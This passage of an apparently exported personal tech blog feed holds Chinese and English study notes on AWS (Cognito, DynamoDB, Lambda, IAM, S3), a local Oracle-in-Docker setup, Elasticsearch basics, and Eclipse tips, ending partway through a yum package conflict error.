Authentication + Authorization</span><br><span class="line"></span><br><span class="line">JWT - Json Web Token</span><br><span class="line"></span><br><span class="line">AK/SK - (Access Key ID/Secret Access Key)</span><br><span class="line"></span><br><span class="line">——————————</span><br><span class="line"></span><br><span class="line">User pool ID</span><br><span class="line"></span><br><span class="line">ap-northeast-1_XKt5DSA1h</span><br><span class="line"></span><br><span class="line">ARN</span><br><span class="line"></span><br><span class="line">arn:aws:cognito-idp:ap-northeast-1:408847233856:userpool/ap-northeast-1_XKt5DSA1h</span><br><span class="line"></span><br><span class="line">Client ID</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PollyNotesWeb</span><br><span class="line"></span><br><span class="line">7b8q9eokiutqaiopicagver0pg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;aud&quot;</span>: <span class="string">&quot;7b8q9eokiutqaiopicagver0pg&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;auth_time&quot;</span>: <span class="string">&quot;1664517043&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;cognito:username&quot;</span>: <span class="string">&quot;student&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;event_id&quot;</span>: <span class="string">&quot;777335cc-211e-4135-a0c7-52f30a2f726d&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;exp&quot;</span>: <span class="string">&quot;Fri Sep 30 06:50:43 UTC 2022&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;iat&quot;</span>: <span class="string">&quot;Fri Sep 30 05:50:43 UTC 2022&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;iss&quot;</span>: <span class="string">&quot;https://cognito-idp.ap-northeast-1.amazonaws.com/ap-northeast-1_XKt5DSA1h&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;jti&quot;</span>: <span class="string">&quot;7a6524c6-d31c-471b-a2cd-05a823eb8583&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;origin_jti&quot;</span>: <span class="string">&quot;da0835fd-4515-4fc4-953c-41b64c2a63d8&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;sub&quot;</span>: <span class="string">&quot;9cce2eae-0dcf-4299-bdf6-0765c6231938&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;token_use&quot;</span>: <span class="string">&quot;id&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">———————————</span><br><span class="line"></span><br><span class="line">DevOps - Development and operation culture</span><br><span class="line"></span><br><span class="line">standardize</span><br><span class="line"></span><br><span class="line">Infrastructure as code - IaC</span><br><span class="line"></span><br><span class="line">observability - logging metrics tracing</span><br><span class="line"></span><br><span class="line">EventBridge</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@annotation == @director</span><br><span class="line"></span><br><span class="line">避免Lambda looping是 不使用Lambda invoke 使用StepsFunction</span><br><span class="line"></span><br><span class="line">用retry取代loop</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>AWS</category>
      </categories>
      <tags>
        <tag>AWS</tag>
      </tags>
  </entry>
  <entry>
    <title>Developing On AWS Memo II</title>
    <url>/posts/9e0684c/</url>
    <content><![CDATA[<h3 id="Developing-On-AWS-Memo-II"><a href="#Developing-On-AWS-Memo-II" class="headerlink" title="Developing On AWS Memo II"></a>Developing On AWS Memo II</h3><span id="more"></span>
<p>這篇紀錄Developing On AWS Memo II。</p>
<h3 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Schema on write(SQL) &amp; scheme on <span class="built_in">read</span></span><br><span class="line"></span><br><span class="line">NOSQL是為了解決SQL的問題 single node的天花板瓶頸 </span><br><span class="line"></span><br><span class="line">雲端的好處是水平擴展</span><br><span class="line"></span><br><span class="line">Cloud-Native Design / Thinking</span><br><span class="line"></span><br><span class="line">AWS Managed Service - Serverless solution</span><br><span class="line"></span><br><span class="line">最終一致性 : 隨著時間過去 最終資料會有一致性</span><br><span class="line"></span><br><span class="line">C (consistently) A(availability) P (Partition)三點無法同時取得</span><br><span class="line"></span><br><span class="line">DynamoDB Strongly consistently versus eventually consistently</span><br><span class="line"></span><br><span class="line">Low-latency queries - single digit ms response time. 1 record max <span class="built_in">limit</span> 400K. Max <span class="built_in">limit</span> 	100MB.</span><br><span class="line"></span><br><span class="line">Column - Row versus Item - Attributes</span><br><span class="line"></span><br><span class="line">Partition key(only 1) and <span class="built_in">sort</span> key ( 0 ~ 1 ) are primary key.</span><br><span class="line"></span><br><span class="line">10 session / sec -&gt; 1 <span class="built_in">read</span> / sec -&gt; 8KB / item</span><br><span class="line"></span><br><span class="line">10 * 1 * 2 = 20 RCU to achieve strongly consistently</span><br><span class="line"></span><br><span class="line">10 session / sec -&gt; 1 <span class="built_in">read</span> / sec -&gt; 14KB / item</span><br><span class="line"></span><br><span class="line">10 * 1 * 2 = 40 RCU to achieve strongly consistently</span><br><span class="line"></span><br><span class="line">Eventually consistently is half strongly consistently. (20 RCU - 40 RCU)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GSI : Global secondary index Partition key 與 Sort key 可以不同 與 data不同Partition 有不同的RCU/WCU</span><br><span class="line"></span><br><span class="line">LSI : Local secondary index 跟data放在相同的Partition 需在 create table前做</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Burst capacity is 5 mins </span><br><span class="line"></span><br><span class="line">適合當作Partition key 是識別唯一值 uuid , sequenceid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NoSQL Workbench : DynamoDB Amazon Keyspaces</span><br><span class="line"></span><br><span class="line">Recommend : Object Persistence Interface</span><br><span class="line"></span><br><span class="line">HASH is Partition Key</span><br><span class="line"></span><br><span class="line">RANGE is Sort Key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DynamoDB’s based on item store on different partition.</span><br><span class="line"></span><br><span class="line">Control plane - DDL</span><br><span class="line"></span><br><span class="line">Data plane - DML</span><br><span class="line"></span><br><span class="line">High cardinality - 變化性高</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LSI : duplicate data <span class="keyword">for</span> another table</span><br><span class="line"></span><br><span class="line">Batch-write-item can prepare .json file max items is 25.</span><br><span class="line"></span><br><span class="line">Get-item : <span class="keyword">if</span> has <span class="built_in">sort</span> key please add <span class="built_in">sort</span> key to request.</span><br><span class="line"></span><br><span class="line">Over 1 MB will pagination.</span><br><span class="line"></span><br><span class="line">Parallel scan <span class="keyword">do</span> mapreduce.</span><br><span class="line"></span><br><span class="line">DAX 10的負6次方 ms , only support DML</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Lambda max limits is 1000 runtime.</span><br><span class="line"></span><br><span class="line">Event <span class="built_in">source</span> -&gt; invoke permission -&gt; Function -&gt; </span><br><span class="line"></span><br><span class="line">Create layer</span><br><span class="line"></span><br><span class="line">Max layers is 5.</span><br><span class="line"></span><br><span class="line">Lambda max time <span class="built_in">limit</span> is 15 mins.</span><br><span class="line"></span><br><span class="line">How to avoid cold start to stop <span class="keyword">do</span> shutdown.</span><br><span class="line"></span><br><span class="line">Use kepalive to avoid cold start.</span><br><span class="line"></span><br><span class="line">不要將Lambda當 EC2使用</span><br><span class="line"></span><br><span class="line">Event : upstream </span><br><span class="line"></span><br><span class="line">context : involvement</span><br><span class="line"></span><br><span class="line">Lambda re deploy will reset variable to init.</span><br><span class="line"></span><br><span class="line">Lambda <span class="built_in">source</span> code <span class="built_in">limit</span> is 250MB. ZIP <span class="built_in">limit</span> is 50MB.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Fileb (b is byte)</span><br><span class="line"></span><br><span class="line">Amazon ECR : dockerhub </span><br><span class="line"></span><br><span class="line">Customer facing : API Gateway</span><br><span class="line"></span><br><span class="line">HTTP : Simple HTTP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Support Swagger configuration</span><br><span class="line"></span><br><span class="line">Support Canary releases 金絲雀部署</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>AWS</category>
      </categories>
      <tags>
        <tag>AWS</tag>
      </tags>
  </entry>
  <entry>
    <title>安裝Docker For Oracle</title>
    <url>/posts/f1a2c8af/</url>
    <content><![CDATA[<h3 id="安裝Docker-For-Oracle"><a href="#安裝Docker-For-Oracle" class="headerlink" title="安裝Docker For Oracle"></a>安裝Docker For Oracle</h3><span id="more"></span>
<p>這篇介紹如何安裝Oracle的Docker來建立本地端資料庫。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.安裝 Docker Desktop <span class="keyword">for</span> Windows (下載後一步一步安裝)</span><br><span class="line"></span><br><span class="line">https://www.docker.com/products/docker-desktop</span><br><span class="line"></span><br><span class="line">2.匯入 Docker Repository</span><br><span class="line"></span><br><span class="line">用系統管理員權限開啟命令提示字元(cmd)</span><br><span class="line"></span><br><span class="line">//oracle11g.tar必須<span class="built_in">cd</span>到指定路徑下</span><br><span class="line">$ docker import oracle11g.tar <span class="built_in">local</span>/oracle11g</span><br><span class="line">//檢查狀態</span><br><span class="line">$ docker images -a </span><br><span class="line"></span><br><span class="line">3. 執行 Docker</span><br><span class="line"></span><br><span class="line">$ docker run --privileged --name oraclelocal -d -p 11521:1521 -e ORACLE_ALLOW_REMOTE=<span class="literal">true</span> -v /home:/install <span class="built_in">local</span>/oracle11g /assets/entrypoint.sh</span><br><span class="line"></span><br><span class="line">4.run 成功</span><br><span class="line"></span><br><span class="line">可以用 docker ps -a 檢查狀態</span><br><span class="line"></span><br><span class="line">在 docker 的 dashboard 也可以看到，如下圖</span><br></pre></td></tr></table></figure>
<img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/DockerSuccuss.png" width="50%" />

<h3 id="參數說明"><a href="#參數說明" class="headerlink" title="參數說明"></a>參數說明</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Docker 執行 Image 產生 Container (run)</span></span><br><span class="line"><span class="comment"># --privileged 是給予權限，安裝oracle時可能會需要root權限</span></span><br><span class="line"><span class="comment"># --name oracle11g 命名 Container 為 oracle11g</span></span><br><span class="line"><span class="comment"># -d 會自動執行 docker pull + 啟動並進入背景執行</span></span><br><span class="line"><span class="comment"># 11521:1521 把裡面的 1521 port 導到外面的 11521 port (host Port:container Port)</span></span><br><span class="line"><span class="comment"># -e ORACLE_ALLOW_REMOTE=true 的作用是開啟遠程連接，如果只是本地使用可以寫成這樣：</span></span><br><span class="line"><span class="comment"># -v 掛載點 /home 目前 Local 環境目錄 ; /install Container 目錄</span></span><br></pre></td></tr></table></figure>

<h3 id="Oracle登入資訊"><a href="#Oracle登入資訊" class="headerlink" title="Oracle登入資訊"></a>Oracle登入資訊</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">HostName/IP Address:localhost</span><br><span class="line">Port:11521</span><br><span class="line">Service Name/SID:ORCL			//選擇SID</span><br><span class="line">UserName:bac_test</span><br></pre></td></tr></table></figure>

<h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker images -a			查看現有 docker <span class="built_in">local</span> repository</span><br><span class="line">docker ps -a				查看現有 container</span><br><span class="line">docker stop oraclelocal		停止特定container 最後一個參數是 container<span class="string">&#x27;s name or Id</span></span><br><span class="line"><span class="string">docker start oraclelocal	開啟特定container 最後一個參數是 container&#x27;</span>s name or Id</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>Developing On AWS Memo I</title>
    <url>/posts/594e1763/</url>
    <content><![CDATA[<h3 id="Developing-On-AWS-Memo-I"><a href="#Developing-On-AWS-Memo-I" class="headerlink" title="Developing On AWS Memo I"></a>Developing On AWS Memo I</h3><span id="more"></span>
<p>這篇紀錄Developing On AWS Memo I。</p>
<h3 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">APM : Application Performance Monitor</span><br><span class="line"></span><br><span class="line">SigV4 : https://docs.aws.amazon.com/general/latest/gr/signature-version-4.html (檢查對時)</span><br><span class="line"></span><br><span class="line">檢查時間戳記是用來避免RePlay造成DDos攻擊</span><br><span class="line"></span><br><span class="line">Throttling</span><br><span class="line"></span><br><span class="line">使用SDKs操作S3或 DynamoDB是非同步的 需做狀態檢查</span><br><span class="line"></span><br><span class="line">Pagination support : DyamoDB下載限制1MB , SDKs才有續傳功能</span><br><span class="line"></span><br><span class="line">Low-level api 需自行close connection</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CLI TIP: </span><br><span class="line"></span><br><span class="line">aws —cli-auto-prompt</span><br><span class="line"></span><br><span class="line"><span class="built_in">alias</span> aws=‘aws —cli-auto-prompt’</span><br><span class="line"></span><br><span class="line">aws lambda get-function —function-name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Wrapper : <span class="keyword">while</span> loop包裝在方法裡面</span><br><span class="line"></span><br><span class="line">The service client APIs provide a higher-level abstraction than the low-level </span><br><span class="line">calls made by client APIs.</span><br><span class="line"></span><br><span class="line">Each AWS SDK implements automatic retry logic. (AWS SDK會自動retry 2 <span class="built_in">times</span>)</span><br><span class="line"></span><br><span class="line">3A : atthentication authZ accountry</span><br><span class="line"></span><br><span class="line">IAM = authentication + authZ</span><br><span class="line"></span><br><span class="line">Accountry -&gt; cloudTrail</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Identity-based policy : Statement -&gt; Effect Action Resource</span><br><span class="line"></span><br><span class="line">ARN : Amazon Resource Name &lt;—&gt; bucket ex: “arn:&#123;partition&#125;:&#123;service name&#125;:</span><br><span class="line">&#123;region&#125;:&#123;account&#125;:&#123;bucket name or table name&#125;”</span><br><span class="line"></span><br><span class="line">&#123;partition&#125; : global = aws</span><br><span class="line"></span><br><span class="line">&#123;region&#125; : us-west-z  AP-northeast-1</span><br><span class="line"></span><br><span class="line">&#123;account&#125; : 12碼  account <span class="built_in">id</span></span><br><span class="line"></span><br><span class="line">*=wildcard</span><br><span class="line"></span><br><span class="line">S3 bucket 有兩個component -&gt; object &amp; bucket (both has actions)</span><br><span class="line"></span><br><span class="line">Bucket level + object level</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Resource-based policy考試會考判讀 : Statement -&gt; Principal (Who)</span><br><span class="line"></span><br><span class="line">考題會問～</span><br><span class="line"></span><br><span class="line">Required : Effect Action Resource</span><br><span class="line"></span><br><span class="line">Optional : Principal Condition</span><br><span class="line"></span><br><span class="line">Permission boundaries : 限縮開放的權限規則</span><br><span class="line"></span><br><span class="line">Effect + Permission boundaries 的交集</span><br><span class="line"></span><br><span class="line">一般不建議一個系統開一個IAM帳號 取而代之會使用Role account</span><br><span class="line"></span><br><span class="line">Why use user role? Role-based access control : 一個使用者在特定時間當下只能</span><br><span class="line">使用一個role (避免人在Multitask時犯錯)</span><br><span class="line"></span><br><span class="line">Assume role </span><br><span class="line"></span><br><span class="line">Assume back -&gt; remove QA role back to develop role</span><br><span class="line"></span><br><span class="line">Default -&gt; always Deny</span><br><span class="line"></span><br><span class="line">當logic conflict -&gt; 有 Deny &amp; Allow -&gt; always deny</span><br><span class="line"></span><br><span class="line">AWS Credentials : aws s3 <span class="built_in">ls</span> —profile user1</span><br><span class="line"></span><br><span class="line">IaC : infrastructure access code</span><br><span class="line"></span><br><span class="line">Security credentials 建議使用instance profile -&gt; role -&gt; permission -&gt; STS -&gt; AK/SK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Provisioned(預先配置) IOPS -&gt; QoS</span><br><span class="line"></span><br><span class="line">Unix -&gt; NFS Network File System</span><br><span class="line"></span><br><span class="line">FSx <span class="keyword">for</span> Windows File Server (Samba) versus FSx <span class="keyword">for</span> Lustre (DFS) = Distribution File System</span><br><span class="line"></span><br><span class="line">EFS Standard expensive than EFS Infrequent access</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">S3 object include 3 parts : content meta key = abs path</span><br><span class="line"></span><br><span class="line">S3 object I/O always equal max volume</span><br><span class="line"></span><br><span class="line">S3 (disk=real time access) versus S3 Glacier (Tape)</span><br><span class="line"></span><br><span class="line">30天沒被access 會從Standard to Standard-IA</span><br><span class="line"></span><br><span class="line">One-Zone-IA : 1 copy -&gt; 1 zone =&gt; cost down</span><br><span class="line"></span><br><span class="line">1 data store S3 standard <span class="keyword">for</span> 3 AZ (3 Redudant) <span class="keyword">for</span> 99.999999999%</span><br><span class="line"></span><br><span class="line">S3 : AWS Managed Service</span><br><span class="line"></span><br><span class="line">https://&#123;bucket name&#125;.&#123;service code&#125;.&#123;Region&#125;.amazonaws.com/&#123;Prefix&#125;/&#123;Name&#125; =&gt; 沒有Folder</span><br><span class="line"></span><br><span class="line">Object = Prefix (Create Folder) + Name</span><br><span class="line"></span><br><span class="line">Prefix : Dev/ + Delimiter : / =&gt; Dev/a.txt (corrent)</span><br><span class="line"></span><br><span class="line">S3 Versioning default close -&gt; file replace</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DELETE - insert Delete Marker</span><br><span class="line"></span><br><span class="line">S3 access points</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Dualstack support both IPv4 and IPv6</span><br><span class="line"></span><br><span class="line">S3 bucket’s naming is Global but Region has to <span class="built_in">set</span>.</span><br><span class="line"></span><br><span class="line">Create S3 bucket is async action.</span><br><span class="line"></span><br><span class="line">Many endpoints by <span class="built_in">functions</span>.</span><br><span class="line"></span><br><span class="line">Head-bucket is meta-data.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">—generate-cli-skeleton output</span><br><span class="line"></span><br><span class="line">S3 versioning 一但Enabled 就不能disabled , 只能暫時suspended</span><br><span class="line"></span><br><span class="line">Single upload Size &lt;= 5GB</span><br><span class="line"></span><br><span class="line">Multipart upload : Split file part &lt;= 5GB (<span class="built_in">local</span>) -&gt; initial Retrieve UploadID</span><br><span class="line"></span><br><span class="line">超過500MB檔案就建議使用Multipart upload </span><br><span class="line"></span><br><span class="line">Multipart upload 有續傳的能力</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">S3 Select 用於.csv .json 這種 semi-structure data 可以做select from <span class="built_in">where</span>…. (不支援Group by)</span><br><span class="line"></span><br><span class="line">Presigned URL : 在時效內(expiration <span class="built_in">date</span>)提供URL供對方存取</span><br><span class="line"></span><br><span class="line">IsTruncated : <span class="literal">true</span> -&gt; 資料有分頁</span><br><span class="line"></span><br><span class="line">S3 Batch : support Server to Server copy</span><br><span class="line"></span><br><span class="line">CORS setting : AllowedOrigin</span><br><span class="line"></span><br><span class="line">S3 Select <span class="keyword">for</span> object -&gt; subset -&gt; <span class="built_in">return</span> client.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>AWS</category>
      </categories>
      <tags>
        <tag>AWS</tag>
      </tags>
  </entry>
  <entry>
    <title>ElasticSearch Basic Memo</title>
    <url>/posts/6ce2e1a9/</url>
    <content><![CDATA[<h3 id="ElasticSearch-Basic-Memo"><a href="#ElasticSearch-Basic-Memo" class="headerlink" title="ElasticSearch Basic Memo"></a>ElasticSearch Basic Memo</h3><span id="more"></span>
<p>這篇紀錄ElasticSearch Basic Memo。</p>
<h3 id="Memo"><a href="#Memo" class="headerlink" title="Memo"></a>Memo</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">elastic.co</span><br><span class="line"></span><br><span class="line">./bin/elasticsearch -E xpack.security.enabled=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">./bin/elasticsearch -d</span><br><span class="line"></span><br><span class="line">./bin/kibana &amp;</span><br><span class="line"></span><br><span class="line">DSL domain specific language</span><br><span class="line"></span><br><span class="line">query (沒有cache) versus filter (有cache)</span><br><span class="line"></span><br><span class="line">bool query support must(必須滿足) &amp; term filter(比對)</span><br><span class="line"></span><br><span class="line">query term === sql <span class="built_in">where</span>條件</span><br><span class="line"></span><br><span class="line">indexing =&gt; 將句子裡的單字拆解成各個token並轉小寫</span><br><span class="line"></span><br><span class="line">_type(舊版) -&gt; _doc(新版)</span><br><span class="line"></span><br><span class="line">8.0版 不支援 */_doc/_mapping</span><br><span class="line"></span><br><span class="line">elasticsearch 的 _mapping 不允許破壞性更新</span><br><span class="line"></span><br><span class="line">default </span><br><span class="line">1.<span class="built_in">type</span> 是給 text</span><br><span class="line">2.fields keyword <span class="built_in">type</span> : keyword</span><br><span class="line">因兩種indexing都做，所以佔用的disk部分會較多</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;fields&quot;</span>: &#123; <span class="string">&quot;original&quot;</span>: &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;keyword&quot;</span>&#125; &#125; 允許擴充</span><br><span class="line"></span><br><span class="line">*設計mapping再做document indexing</span><br><span class="line"></span><br><span class="line">neal real-time 近乎即時 equal Non real-time</span><br><span class="line"></span><br><span class="line">Apache Lucene 做全文檢索的open <span class="built_in">source</span></span><br><span class="line"></span><br><span class="line">Term 進行搜尋時的最小單位</span><br><span class="line"></span><br><span class="line">Master node可參與選舉 Voting node 只能參與投票</span><br><span class="line"></span><br><span class="line">一台機器有500 shard versus 五台機器各有100個shard</span><br><span class="line"></span><br><span class="line">一個shard大小不要超過50GB (非絕對) why?</span><br><span class="line">考慮Cluster規模 及 資料大小</span><br><span class="line"></span><br><span class="line">GET API is real-time，search is neal real-time</span><br><span class="line"></span><br><span class="line">mapping stored_fields</span><br><span class="line"></span><br><span class="line">Update不是真的更新 是將舊文件刪除 重新indexing (delete + add)</span><br><span class="line"></span><br><span class="line">_seq_no 是 該index中只要有異動給的流水號</span><br><span class="line"></span><br><span class="line">_primary_term : primary_shard 有改變就會+1</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;_source&quot;</span>:&#123;<span class="string">&quot;enabled&quot;</span>:<span class="literal">false</span>&#125; 不儲存在_source 但還是查的到_id</span><br><span class="line"></span><br><span class="line">Bulk API use NDJSON(newline-delimited JSON)</span><br><span class="line">一行一個JSON object</span><br><span class="line">先從1000~5000 documents/request 5MB~15MB開始測量</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;_shards&quot;</span>: &#123;</span><br><span class="line">	<span class="string">&quot;total&quot;</span>: 2,</span><br><span class="line">	<span class="string">&quot;successful&quot;</span>: 2,</span><br><span class="line">	<span class="string">&quot;skipped&quot;</span>: 0,</span><br><span class="line">	<span class="string">&quot;failed&quot;</span>: 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_search bool must + filter</span><br><span class="line"></span><br><span class="line">from + size 不能超過 index.max_result_window (10000筆)</span><br><span class="line"></span><br><span class="line">ElasticSearch Sort很耗記憶體</span><br><span class="line"></span><br><span class="line">不要讓使用者直接存取index 而是讓使用者存取<span class="built_in">alias</span></span><br><span class="line"></span><br><span class="line">Global Priority Queue 會拿回 (from + size) * Local Priority Queue數量</span><br><span class="line"></span><br><span class="line">Deep pagination</span><br><span class="line">1.Scroll API 建立snapshot</span><br><span class="line">2.Search after </span><br><span class="line"></span><br><span class="line"><span class="string">&quot;apple&quot;</span> <span class="string">&quot;apple a&quot;</span> <span class="string">&quot;apple b&quot;</span> 放在不同shard的score會相同</span><br><span class="line"></span><br><span class="line">Elasticsearch Persistence </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ElasticSearch Day2</span><br><span class="line"></span><br><span class="line">edge-ngram used by autocomplete &amp; auto-suggestion</span><br><span class="line"></span><br><span class="line">range query : 適用數值 &amp; 日期條件</span><br><span class="line"></span><br><span class="line">terms query 等於 RDB IN的語法</span><br><span class="line"></span><br><span class="line">fuzzy 查詢建議使用其它查詢來代替 因效能不佳!</span><br><span class="line"></span><br><span class="line">Nested Term Aggregation</span><br><span class="line"></span><br><span class="line">doc_values : <span class="literal">false</span> 節省硬碟空間</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>How to Remove Eclipse Vertical Red Line</title>
    <url>/posts/951956cc/</url>
    <content><![CDATA[<h3 id="Intro-How-to-Remove-Eclipse-Vertical-Red-Line"><a href="#Intro-How-to-Remove-Eclipse-Vertical-Red-Line" class="headerlink" title="Intro How to Remove Eclipse Vertical Red Line"></a>Intro How to Remove Eclipse Vertical Red Line</h3><span id="more"></span>
<p>這篇介紹How to Remove Eclipse Vertical Red Line。</p>
<h3 id="Eclipse-Version"><a href="#Eclipse-Version" class="headerlink" title="Eclipse Version"></a>Eclipse Version</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Version: 2021-06 (4.20.0)</span><br><span class="line"></span><br><span class="line">default:IDE打開，視窗中間會有一條垂直的紅線</span><br></pre></td></tr></table></figure>

<h3 id="Setting"><a href="#Setting" class="headerlink" title="Setting"></a>Setting</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">上方工具列 -&gt; Window -&gt; Preferences -&gt; General -&gt; Editors -&gt; Text Editors -&gt; Show <span class="built_in">print</span> margin (取消打勾)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Eclipse</category>
      </categories>
      <tags>
        <tag>Eclipse</tag>
      </tags>
  </entry>
  <entry>
    <title>Eclipse Install JSHint</title>
    <url>/posts/e321f856/</url>
    <content><![CDATA[<h3 id="Eclipse-Install-JSHint"><a href="#Eclipse-Install-JSHint" class="headerlink" title="Eclipse Install JSHint"></a>Eclipse Install JSHint</h3><span id="more"></span>
<p>JSHint 是一個community-driven工具，用來檢查JavaScript代碼中的錯誤和潛在的問題，規範編碼風格，確保代碼質量。</p>
<h3 id="安裝方法"><a href="#安裝方法" class="headerlink" title="安裝方法"></a>安裝方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.Eclipse主選單 -&gt; Help -&gt; Install New Software</span><br><span class="line">2.在Work with -&gt; http://github.eclipsesource.com/jshint-eclipse/updates/</span><br><span class="line">3.Name -&gt; 將JSHint打勾</span><br></pre></td></tr></table></figure>
<img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/InstallJSHint.png" width="50%" />

<h3 id="更新方法"><a href="#更新方法" class="headerlink" title="更新方法"></a>更新方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">如果已經安装了，就可以進行更新:</span><br><span class="line">Eclipse主選單 -&gt; Help -&gt; Check <span class="keyword">for</span> Updates</span><br></pre></td></tr></table></figure>

<h3 id="卸載方法"><a href="#卸載方法" class="headerlink" title="卸載方法"></a>卸載方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Eclipse主選單 -&gt; Help -&gt; About Eclipse -&gt; Installation Details</span><br><span class="line">choose JSHint Eclipse Integration -&gt; Uninstall</span><br></pre></td></tr></table></figure>

<h3 id="開啟功能"><a href="#開啟功能" class="headerlink" title="開啟功能"></a>開啟功能</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Eclipse主選單 -&gt; Window -&gt; Show View -&gt; Markers</span><br></pre></td></tr></table></figure>
<img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/OpenMarkers.png" width="50%" />
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JSHint</tag>
      </tags>
  </entry>
  <entry>
    <title>Error Containerd io Conflicts With Runc</title>
    <url>/posts/2f8a9f26/</url>
    <content><![CDATA[<h3 id="Intro-Error-Containerd-io-Conflicts-With-Runc"><a href="#Intro-Error-Containerd-io-Conflicts-With-Runc" class="headerlink" title="Intro Error Containerd io Conflicts With Runc"></a>Intro Error Containerd io Conflicts With Runc</h3><span id="more"></span>
<p>這篇介紹Error Containerd io Conflicts With Runc。</p>
<h3 id="情境"><a href="#情境" class="headerlink" title="情境"></a>情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@<span class="built_in">test</span> ~]<span class="comment"># yum install docker-ce docker-ce-cli containerd.io</span></span><br><span class="line">Last metadata expiration check: 0:02:18 ago on Tue 03 Jan 2023 02:12:18 PM CST.</span><br><span class="line">Error:</span><br><span class="line"> Problem: package containerd.io-1.6.14-3.1.el8.x86_64 conflicts with runc provided by runc-1:1.1.4-1.module+el8.7.0+1078+e72fcd4f.x86_64</span><br><span class="line">  - package containerd.io-1.6.14-3.1.el8.x86_64 obsoletes runc provided by runc-1:1.1.4-1.module+el8.7.0+1078+e72fcd4f.x86_64</span><br><span class="line">  - package containers-common-2:1-43.module+el8.7.0+1078+e72fcd4f.x86_64 requires oci-runtime, but none of the providers can be installed</span><br><span class="line">  - cannot install the best candidate <span class="keyword">for</span> the job</span><br><span class="line">  - problem with installed package containers-common-2:1-43.module+el8.7.0+1078+e72fcd4f.x86_64</span><br><span class="line">  - package crun-0.18-3.module+el8.7.0+1076+9b1c11c1.x86_64 is filtered out by modular filtering</span><br><span class="line">  - package crun-1.5-1.module+el8.7.0+1077+0e4f03d4.x86_64 is filtered out by modular filtering</span><br><span class="line">  - package crun-1.5-1.module+el8.7.0+1078+e72fcd4f.x86_64 is filtered out by modular filtering</span><br><span class="line">  - package runc-1.0.0-73.rc95.module+el8.7.0+1076+9b1c11c1.x86_64 is filtered out by modular filtering</span><br><span class="line">  - package runc-1:1.1.4-1.module+el8.7.0+1077+0e4f03d4.x86_64 is filtered out by modular filtering</span><br><span class="line">  - package runc-1:1.1.4-1.module+el8.7.0+1078+e72fcd4f.x86_64 is filtered out by modular filtering</span><br><span 